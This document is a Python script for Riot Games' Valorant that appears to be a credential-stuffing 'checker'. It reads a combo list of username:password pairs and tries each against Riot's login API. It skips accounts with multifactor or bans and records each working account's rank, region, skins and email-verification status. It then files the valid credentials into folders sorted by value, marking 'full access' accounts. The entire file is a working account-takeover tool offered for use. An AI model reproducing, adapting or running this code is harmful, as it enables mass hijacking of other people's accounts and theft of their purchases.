import colorama
from colorama import Fore, init
from urllib import request
import requests
from requests import session as sesh
from requests.adapters import HTTPAdapter
from ssl import PROTOCOL_TLSv1_2
from urllib3 import PoolManager
import tkinter
from tkinter import *
from tkinter import filedialog, messagebox
from collections import OrderedDict
from re import compile
import pandas
import time
import os
import ctypes
from time import sleep
from datetime import datetime


init(convert=True)

failed = 0
checked = 0
good = 0
timeban = 0
cant_use = 0
notexist = 0
rate = 0
verified = 0
unverified = 0
xds = []
eu = 0
na = 0
br = 0
kr = 0
latam = 0
ap = 0
errors = 0

verified = 0
trueverified = 0
ratelimit = 0

no_rank = 0
unranked = 0
iron = 0
bronze = 0
silver = 0
gold = 0
platinum = 0
diamond = 0
ascendant = 0
immortal = 0
radiant = 0


_1_9 = 0
_10_19 = 0
_20_29 = 0
_30_39 = 0
_40_49 = 0
_50_99 = 0
_100_150 = 0
_151 = 0
num = 0
skinned = 0
no_skins = 0
root = tkinter.Tk()
root.withdraw()

class TLSAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False):
        self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block,
                                       ssl_version=PROTOCOL_TLSv1_2)
def create(name):
    if not os.path.exists(name):
        os.mkdir(name)
def checker():
    global good, timeban, cant_use, notexist, rate, checked, verified, unverified, errors, failed, cpm1, cpm2, no_rank
    global skinned, no_skins, good, eu, na, br, kr, latam, ap, ratelimit, unranked, iron, bronze, silver, gold, platinum, diamond, ascendant, immortal, radiant, _1_9, _10_19, _20_29, _30_39, _40_49, _50_99, _100_150, _151
    white = {Fore.WHITE}
#get_input   
    print()
    print(Fore.LIGHTGREEN_EX + "Choose your combo:")
    fileNameCombo = filedialog.askopenfile(parent=root, mode='rb', title='Choose your combo',filetypes=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameCombo is None:
        print()
        print(Fore.RED + "Please select valid combo file!")
        time.sleep(2)
        sys.exit()
    else:
        try:
            file1 = open(fileNameCombo.name, 'r+', encoding='utf-8')
            lines = file1.readlines()
            with open(fileNameCombo.name, 'r+', encoding='utf-8') as e:
                ext = e.readlines()
                for line in ext:
                    xd = line.split(":")[0].replace('\n', '')
                    xds.append(xd)
                num = len(xds)
            print(Fore.LIGHTGREEN_EX + "Loaded [{}] combos lines ".format(len(xds)))
            time.sleep(2)
        except Exception:
            print(Fore.RED + "Your combo file is probably harmed, please try again")
            time.sleep(2)
#create path for result 
    os.system("cls")
    print(Fore.GREEN +  "Please wait while we create folders for capture...") 
    time.sleep(2)    
    now = datetime.now()
    dt_string = now.strftime("%d-%m-%Y %H.%M.%S")  
    create("Results")
    create(os.path.join("Results/"))
    create(os.path.join("Results/", "true,/"))
    create(os.path.join("Results/", "false,/"))
    folders = [
        "EU",
        "NA",
        "KR",
        "AP",
        "BR",
        "LATAM"
    ]
    for folder in folders:
        path = os.path.join("Results/" + "/true,/",folder)
        create(path)
        path = os.path.join("Results/" + "/true,/" + folder, "UserPass/")
        create(path)
    for folder in folders:
        path = os.path.join("Results/" + "/false,/",folder)
        create(path)
        path = os.path.join("Results/" + "/false,/" + folder, "UserPass/")
        create(path)
    os.system("cls")
#checker main function    
    for line in lines:
        username = line.split(":")[0].replace('\n', '')
        password = line.split(":")[1].replace('\n', '')
        euwrite = open(f"Results//checked.txt", "a+", encoding='utf-8')
        euwrite.write(f"{username}:{password}\n")
        euwrite.close
        ctypes.windll.kernel32.SetConsoleTitleW(f"vinh#0370")
        os.system("cls")
        reset = Fore.RESET
        cyan = Fore.CYAN
        green = Fore.LIGHTGREEN_EX
        red = Fore.LIGHTRED_EX
        yellow = Fore.LIGHTYELLOW_EX
        space = " "
        print((f''' {green}
     ██████╗██╗       ██╗  ███╗  ███╗  ██╗██╗  ██╗
    ██╔════╝██║  ██╗  ██║ ████║  ████╗ ██║██║  ██║
    ╚█████╗ ╚██╗████╗██╔╝██╔██║  ██╔██╗██║███████║
     ╚═══██╗ ████╔═████║ ╚═╝██║  ██║╚████║██╔══██║
    ██████╔╝ ╚██╔╝ ╚██╔╝ ███████╗██║ ╚███║██║  ██║
    ╚═════╝   ╚═╝   ╚═╝  ╚══════╝╚═╝  ╚══╝╚═╝  ╚═╝
                    Version: 2.4 '''))
        print((f''' {reset}         
    ╔════════════════════════════════════════════╗ 
    ║                    LOADED  ({green}{num}{reset}){space * (14 - len(str(num)))}║ 
    ╠════════════════════════════════════════════╣ 
    ║  Checked            ({yellow}{checked}{reset}){space * (21 - len(str(checked)))}║
    ║  Good to use        ({green}{good}{reset}){space * (21 - len(str(good)))}║
    ║  Ratelimited        ({Fore.LIGHTRED_EX}{ratelimit}{Fore.RESET}){space * (21 - len(str(ratelimit)))}║   
    ║  Full Access        ({Fore.LIGHTGREEN_EX}{unverified}{Fore.RESET}){space * (21 - len(str(unverified)))}║
    ╠════════════════════════════════════════════╣
    ║                    SKINS                   ║
    ╠════════════════════════════════════════════╣
    ║  0                  ({Fore.LIGHTGREEN_EX}{no_skins}{Fore.RESET}){space * (21 - len(str(no_skins)))}║
    ║  1-9                ({Fore.LIGHTGREEN_EX}{_1_9}{Fore.RESET}){space * (21 - len(str(_1_9)))}║                   
    ║  10-19              ({Fore.LIGHTGREEN_EX}{_10_19}{Fore.RESET}){space * (21 - len(str(_10_19)))}║
    ║  21-29              ({Fore.LIGHTGREEN_EX}{_20_29}{Fore.RESET}){space * (21 - len(str(_20_29)))}║ 
    ║  30-39              ({Fore.LIGHTGREEN_EX}{_30_39}{Fore.RESET}){space * (21 - len(str(_30_39)))}║
    ║  40-49              ({Fore.LIGHTGREEN_EX}{_40_49}{Fore.RESET}){space * (21 - len(str(_40_49)))}║
    ║  50-99              ({Fore.LIGHTGREEN_EX}{_50_99}{Fore.RESET}){space * (21 - len(str(_50_99)))}║
    ║  100-150            ({Fore.LIGHTGREEN_EX}{_100_150}{Fore.RESET}){space * (21 - len(str(_100_150)))}║
    ║  151+               ({Fore.LIGHTGREEN_EX}{_151}{Fore.RESET}){space * (21 - len(str(_151)))}║
    ╠════════════════════════════════════════════╣  
    ║                    RANKS                   ║
    ╠════════════════════════════════════════════╣          
    ║  No rank            ({Fore.LIGHTGREEN_EX}{no_rank}{Fore.RESET}){space * (21 - len(str(no_rank)))}║
    ║  Unranked           ({Fore.LIGHTGREEN_EX}{unranked}{Fore.RESET}){space * (21 - len(str(unranked)))}║ 
    ║  Iron               ({Fore.LIGHTGREEN_EX}{iron}{Fore.RESET}){space * (21 - len(str(iron)))}║
    ║  Bronze             ({Fore.LIGHTGREEN_EX}{bronze}{Fore.RESET}){space * (21 - len(str(bronze)))}║
    ║  Silver             ({Fore.LIGHTGREEN_EX}{silver}{Fore.RESET}){space * (21 - len(str(silver)))}║ 
    ║  Gold               ({Fore.LIGHTGREEN_EX}{gold}{Fore.RESET}){space * (21 - len(str(gold)))}║ 
    ║  Platium            ({Fore.LIGHTGREEN_EX}{platinum}{Fore.RESET}){space * (21 - len(str(platinum)))}║ 
    ║  Diamond            ({Fore.LIGHTGREEN_EX}{diamond}{Fore.RESET}){space * (21 - len(str(diamond)))}║
    ║  Ascendant          ({Fore.LIGHTGREEN_EX}{ascendant}{Fore.RESET}){space * (21 - len(str(ascendant)))}║ 
    ║  Immortal           ({Fore.LIGHTGREEN_EX}{immortal}{Fore.RESET}){space * (21 - len(str(immortal)))}║
    ║  Radiant            ({Fore.LIGHTGREEN_EX}{radiant}{Fore.RESET}){space * (21 - len(str(radiant)))}║
    ╠════════════════════════════════════════════╣
    ║                    REGION                  ║
    ╠════════════════════════════════════════════╣
    ║  EU                 ({Fore.LIGHTGREEN_EX}{eu}{Fore.RESET}){space * (21 - len(str(eu)))}║
    ║  NA                 ({Fore.LIGHTGREEN_EX}{na}{Fore.RESET}){space * (21 - len(str(na)))}║
    ║  AP                 ({Fore.LIGHTGREEN_EX}{ap}{Fore.RESET}){space * (21 - len(str(ap)))}║
    ║  KR                 ({Fore.LIGHTGREEN_EX}{kr}{Fore.RESET}){space * (21 - len(str(kr)))}║
    ║  BR                 ({Fore.LIGHTGREEN_EX}{br}{Fore.RESET}){space * (21 - len(str(br)))}║
    ║  LATAM              ({Fore.LIGHTGREEN_EX}{latam}{Fore.RESET}){space * (21 - len(str(latam)))}║ 
    ╚════════════════════════════════════════════╝     
        {reset}     
        '''))
        headers = OrderedDict({
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "application/json, text/plain, */*",
            'User-Agent': 'RiotClient/51.0.0.4429735.4381211 rso-auth (Windows;10;;Professional, x64)'
        })
        session = sesh()
        session.headers = headers
        session.mount('https://', TLSAdapter())
        data = {
            "acr_values": "urn:riot:bronze",
            "claims": "",
            "client_id": "riot-client",
            "nonce": "oYnVwCSrlS5IHKh7iI16oQ",
            "redirect_uri": "http://localhost/redirect",
            "response_type": "token id_token",
            "scope": "openid link ban lol_region",
        }
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'RiotClient/56.0.0.4578455.4552318 rso-auth (Windows;10;;Professional, x64)',
        }
        r = session.post(f'https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers)
        data = {
            'type': 'auth',
            'username': username,
            'password': password
        }
        r2 = session.put('https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers)
        data = r2.json()
        if "access_token" in r2.text:
            pattern = compile(
                'access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
            data = pattern.findall(data['response']['parameters']['uri'])[0]
            token = data[0]
        elif "auth_failure" in r2.text:
            checked += 1
            cant_use += 1
            continue
        elif "rate_limited" in r2.text:
            ratelimit += 1
            failed += 1
            rmtext = open(f"Results//re_check.txt", "a+", encoding='utf-8')
            rmtext.write(f"{username}:{password}\n")
            rmtext.close()
            checked += 1
            time.sleep(30)
            continue
        elif 'multifactor' in r2.text:
            cant_use += 1
            checked += 1
            continue
        else:
            pattern = compile('access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
            data = pattern.findall(data['response']['parameters']['uri'])[0]
            token = data[0]
        headers = {
            'User-Agent': 'RiotClient/56.0.0.4578455.4552318 rso-auth (Windows;10;;Professional, x64)',
            'Authorization': f'Bearer {token}',
        }
        
        r = session.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers, json={})
        entitlement = r.json()['entitlements_token']
        r = session.post('https://auth.riotgames.com/userinfo', headers=headers, json={})
        data = r.json()
 #check ban       
        try:
            GameName =  r.text.split('game_name":"')[1].split('"')[0]
        except:
            errors += 1
            continue      
        CountryID = r.text.split('country":"')[1].split('"')[0]             
        Tag = r.text.split('tag_line":"')[1].split('"')[0]  
        Sub = r.text.split('sub":"')[1].split('"')[0] 
        EmailVerified = r.text.split('email_verified":')[1].split('"')[0]
        data1 = data['acct']
        unix_time = data1['created_at']
        unix_time = int(unix_time)
        result_s = pandas.to_datetime(unix_time,unit='ms')
        str(result_s)        
        typebanned = None
        result_s1 = None       
        try:
            data = r.json()
            data2 = data['ban']
            data3 = data2['restrictions']
            for x in data3:
                typebanned = x['type']
            if typebanned == "PERMANENT_BAN":
                result_s1 = "Permantent"
                cant_use += 1
                checked += 1
                continue
            if typebanned == "PERMA_BAN":
                result_s1 = "Permantent"
                cant_use += 1
                checked += 1
                continue
            if typebanned == "TIME_BAN":
                cant_use += 1
                checked += 1
                continue
        except:
            checked += 1
            print("unknow error")
            sleep(2)
            continue
        CountryIDtoRegion = {"and":"eu","are":"eu","afg":"eu","atg":"latam","aia":"latam","alb":"eu","arm":"eu","ago":"eu","ata":"eu","arg":"latam","asm":"ap","aut":"eu","aus":"ap","abw":"latam","ala":"eu","aze":"eu","bih":"eu","brb":"latam","bgd":"ap","bel":"eu","bfa":"eu","bgr":"eu","bhr":"eu","bdi":"eu","ben":"eu","blm":"eu","bmu":"latam","brn":"ap","bol":"latam","bes":"latam","bra":"br","bhs":"latam","btn":"ap","bvt":"eu","bwa":"eu","blr":"eu","blz":"latam","can":"na","cck":"ap","cod":"eu","caf":"eu","cog":"eu","che":"eu","civ":"eu","cok":"eu","chl":"latam","cmr":"eu","chn":"ap","col":"latam","cri":"latam","cub":"latam","cpv":"eu","cuw":"eu","cxr":"ap","cyp":"eu","cze":"eu","deu":"eu","dji":"eu","dnk":"eu","dma":"latam","dom":"latam","dza":"eu","ecu":"latam","est":"eu","egy":"eu","esh":"eu","eri":"eu","esp":"eu","eth":"eu","fin":"eu","fji":"ap","flk":"latam","fsm":"ap","fro":"eu","fra":"eu","gab":"eu","gbr":"eu","grd":"latam","geo":"eu","guf":"eu","ggy":"eu","gha":"eu","gib":"eu","grl":"eu","gmb":"eu","gin":"eu","glp":"eu","gnq":"eu","grc":"eu","sgs":"latam","gtm":"latam","gum":"ap","gnb":"eu","guy":"latam","hkg":"ap","hmd":"eu","hnd":"latam","hrv":"eu","hti":"latam","hun":"eu","idn":"ap","irl":"eu","isr":"eu","imn":"eu","ind":"ap","iot":"ap","irq":"eu","irn":"eu","isl":"eu","ita":"eu","jey":"eu","jam":"latam","jor":"eu","jpn":"ap","ken":"eu","kgz":"eu","khm":"ap","kir":"ap","com":"eu","kna":"latam","prk":"ap","kor":"kr","kwt":"eu","cym":"latam","kaz":"eu","lao":"ap","lbn":"eu","lca":"latam","lie":"eu","lka":"ap","lbr":"eu","lso":"eu","ltu":"eu","lux":"eu","lva":"eu","lby":"eu","mar":"eu","mco":"eu","mda":"eu","mne":"eu","maf":"eu","mdg":"eu","mhl":"ap","mkd":"eu","mli":"eu","mmr":"ap","mng":"ap","mac":"ap","mnp":"ap","mtq":"eu","mrt":"eu","msr":"latam","mlt":"eu","mus":"eu","mdv":"ap","mwi":"eu","mex":"latam","mys":"ap","moz":"eu","nam":"eu","ncl":"eu","ner":"eu","nfk":"ap","nga":"eu","nic":"latam","nld":"eu","nor":"eu","npl":"ap","nru":"ap","niu":"ap","nzl":"ap","omn":"eu","pan":"latam","per":"latam","pyf":"eu","png":"ap","phl":"ap","pak":"ap","pol":"eu","spm":"eu","pcn":"ap","pri":"latam","pse":"eu","prt":"eu","plw":"ap","pry":"latam","qat":"eu","reu":"eu","rou":"eu","srb":"eu","rus":"eu","rwa":"eu","sau":"eu","slb":"ap","syc":"eu","sdn":"eu","swe":"eu","sgp":"ap","shn":"eu","svn":"eu","sjm":"eu","svk":"eu","sle":"eu","smr":"eu","sen":"eu","som":"eu","sur":"latam","ssd":"eu","stp":"eu","slv":"latam","sxm":"eu","syr":"eu","swz":"eu","tca":"latam","tcd":"eu","atf":"eu","tgo":"eu","tha":"ap","tjk":"eu","tkl":"ap","tls":"ap","tkm":"eu","tun":"eu","ton":"ap","tur":"eu","tto":"latam","tuv":"ap","twn":"ap","tza":"eu","ukr":"eu","uga":"eu","umi":"ap","usa":"na","ury":"latam","uzb":"eu","vat":"eu","vct":"latam","ven":"latam","vgb":"latam","vir":"latam","vnm":"ap","vut":"ap","wlf":"eu","wsm":"ap","yem":"eu","myt":"eu","zaf":"eu","zmb":"eu","zwe":"eu"}
        Regionnn = CountryIDtoRegion[CountryID]
#get Region + Accountlvl
        try:
            url = (f"https://api.henrikdev.xyz/valorant/v1/account/{GameName}/{Tag}")
            r2 = requests.get(url)
            Region = r2.json()["data"]["region"]
            AccountLevel = r2.json()["data"]["account_level"]
        except:
            failed += 1
            failedtext = open(f"Results//re_check.txt", "a+", encoding='utf-8')
            failedtext.write(f"{username}:{password}\n")
            failedtext.close()
            checked += 1
            continue     
        
        PvpNetHeaders = {"Content-Type": "application/json",
                        "Authorization": f"Bearer {token}",
                        "X-Riot-Entitlements-JWT": entitlement,
                        "X-Riot-ClientVersion": "release-01.08-shipping-10-471230",
                        "X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"
        }
#get last match
        try:
            url = (f"https://api.henrikdev.xyz/valorant/v3/matches/{Region}/{GameName}/{Tag}")
            r = requests.get(url)
            data = r.json()
            data2 = data["data"]
            for x in data2:
                data3 = x['metadata']
            last_time = data3["game_start_patched"]
        except:
            failed += 1
            failedtext = open(f"Results//re_check.txt", "a+", encoding='utf-8')
            failedtext.write(f"{username}:{password}\n")
            failedtext.close()
            checked += 1
            continue
        
#get Rank + rr
        Rank = "No rank"
        try:
            url = (f"https://api.henrikdev.xyz/valorant/v1/mmr/{Region}/{GameName}/{Tag}")
            r = requests.get(url)
            Rank = r.json()["data"]["currenttierpatched"]
            rr = r.json()["data"]["ranking_in_tier"]
        except:
            failed += 1
            failedtext = open(f"Results//re_check.txt", "a+", encoding='utf-8')
            failedtext.write(f"{username}:{password}\n")
            failedtext.close()
            checked += 1
            continue
            
        headers ={
        "X-Riot-Entitlements-JWT": entitlement,
        "Authorization": f"Bearer {token}"
        }
#get Skins
        r = requests.get(f"https://pd.{Region}.a.pvp.net/store/v1/entitlements/{Sub}/e7c63390-eda7-46e0-bb7a-a6abdacd2433",headers=headers)
        response_API = requests.get('https://raw.githubusercontent.com/xharky/Valorant-list/main/Skinlist.txt')
        response = response_API.text
        skinsList = response.splitlines()
        userSkins = []
        SkinStr = ""
        skins = r.json()["Entitlements"]
        for skin in skins:
            UidToSearch = skin['ItemID']
            for item in skinsList:
                details = item.split("|")
                namePart = details[0]
                idPart = details[1]
                name = namePart.split(":")[1]
                id = idPart.split(":")[0].lower()
                if id == UidToSearch:
                    userSkins.append(name)
                    SkinStr += "║ ══ " + name + (space * (49-len(name))) + "║" + "\n"
        skin_amount = len(userSkins)
        skin_amount = int(skin_amount)
        category = "No skin"
        
        if skin_amount == 0:
            no_skins += 1
        elif skin_amount in range(1, 10):
            _1_9 += 1
            category = "1-9 skins"
        elif skin_amount in range(10, 20):
            _10_19 += 1
            category = "10-19 skins"
        elif skin_amount in range(20, 30):
            _20_29 += 1
            category = "20-29 skins"
        elif skin_amount in range(30, 40):
            _30_39 += 1
            category = "30-39 skins"
        elif skin_amount in range(40, 50):
            _40_49 += 1
            category = "40-49 skins"
        elif skin_amount in range(50, 100):
            _50_99 += 1
            category = "50-99 skins"
        elif skin_amount in range(100, 151):
            _100_150 += 1
            category = "100-150 skins"
        elif skin_amount in range(151,1001):
            _151 += 1
            category = "151-1000 skins"
        else:
            errors += 1
#GUI
        if Regionnn == "eu":
            eu += 1
        elif Regionnn == "na":
            na += 1
        elif Regionnn == "kr":
            kr += 1
        elif Regionnn == "ap":
            ap += 1
        elif Regionnn == "latam":
            latam += 1
        elif Regionnn == "br":
            br += 1
        if Rank is None:
            Rank = "No rank"
            Rank2 = "no rank"
        else:
            Rank2 = ''.join([i for i in Rank if not i.isdigit()]) 
            Rank2 = Rank2.lower()
        print(f"{Rank2}")
        if Rank2 == "no rank":
            no_rank += 1
        if Rank2 == "unranked":
            unranked += 1
        if Rank2 == "iron ":
            iron += 1
        if Rank2 == "silver ":
            silver += 1
        if Rank2 == "bronze ":
            bronze += 1
        if Rank2 == "gold ":
            gold += 1
        if Rank2 == "platinum ":
            platinum += 1
        if Rank2 == "diamond ":
            diamond += 1
        if Rank2 == "ascendant ":
            ascendant += 1
        if Rank2 == "immortal ":
            immortal += 1
        if Rank2 == "radiant ":
            radiant += 1
#output
        Regionnn = Regionnn.upper()
        checked += 1
        good += 1
        roait = (f"╔═════════════════════╦═════════╦═════════════════════╗\n╠═════════════════════╣  SW1NH  ╠═════════════════════╣\n║                     ╚═════════╝                     ║\n║ ══ User&Pass: {username}:{password}{space * (37-(len(username)+len(password)))}║\n║ ══ Game Name: {GameName}#{Tag}{space * (37 - (len(GameName)+len(str(Tag))))}║\n║ ══ Region: {Regionnn} ({CountryID}){space * (38-(len(Regionnn)+3))}║\n║ ══ NFA: {EmailVerified}{space *(44-len(EmailVerified))}║\n║ ══ Level: {AccountLevel}{space * (42-(len(str(AccountLevel))))}║\n║ ══ Rank: {Rank} ({rr}){space * (40-((len(Rank)+len(str(rr)))))}║\n║ ══ Last match: {last_time}{space * (37-len(last_time))}║\n╠═════════════════════════════════════════════════════╣ \n║ ══ Category: {category}{space * (39-len(category))}║\n║ ══ Skins:({skin_amount}){space * (41 - (len(str(skin_amount))))}║\n{SkinStr}╚═════════════════════════════════════════════════════╝\n\n")
        euwrite = open(f"Results//{EmailVerified}//{Regionnn}//{category}.txt", "a+", encoding='utf-8')
        euwrite.write(f"{roait}")
        euwrite.close
        euwrite = open(f"Results//{EmailVerified}//{Regionnn}//UserPass//{category}.txt", "a+", encoding='utf-8')
        euwrite.write(f"{username}:{password}\n")
        euwrite.close
checker()
